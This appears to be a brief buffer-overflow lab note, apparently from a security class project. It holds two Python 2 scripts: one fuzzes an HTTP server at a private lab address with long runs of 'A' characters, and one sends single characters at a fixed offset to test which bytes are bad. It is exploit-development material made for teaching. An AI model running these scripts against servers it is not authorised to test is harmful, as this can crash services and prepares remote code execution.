Quick Fuzzer

```
import socket
s = socket.socket()

s.connect(("172.16.1.249", 80))

n = int( raw_input("Number of A's:"))

req = "GET " + "A" * n
req += " HTTP/1.1\r\n"
req += "Host: 172.16.1.249\r\n\r\n"

s.send(req)
print s.recv(1024)
```

Demo for testing bad characters individually \(crash indicates its valid / hanging indicates invalid character\)

```
import socket
s = socket.socket()

s.connect(("172.16.1.249", 80))

n = int( raw_input( "Ascii code:") )

test = chr(n)

attack = test + "A" * (170 - len(test))
attack += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"

req = "GET " +  attack
req += " HTTP/1.1\r\n"
req += "Host: 172.16.1.249\r\n\r\n"

s.send(req)
print s.recv(1024)
```



Reference:

https://samsclass.info/127/proj/p10xbo.htm

